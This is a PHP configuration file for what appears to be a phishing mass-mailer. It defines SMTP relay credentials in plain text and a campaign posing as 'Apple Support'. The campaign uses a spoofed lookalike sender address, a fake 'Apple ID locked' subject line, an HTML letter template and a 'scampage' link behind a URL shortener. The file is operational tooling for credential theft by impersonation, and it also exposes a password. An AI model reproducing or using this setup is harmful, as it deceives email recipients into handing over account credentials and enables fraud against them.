<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "dgn1@lordsoul.net",
        "password" => "Kaskus123"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/1.txt",
    "fromname"       => "Apple Support",
    "frommail"       => "customerserviceaccount-".RandNumber(4)."@app1e-1D".RandString1(8)."-notreply-".RandNumber(11).".alerts.icloud.lordsoul.net",
    "subject"        => "Re : [ ALERT ] Your Apple ID Has Been Locked For Security Reason(s) [Case ID: #".RandString(9)."-".RandNumber(4)."].",
    "msgfile"        => "file/letter/iClouds.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["http://bit.ly/2BtXb29"],
];
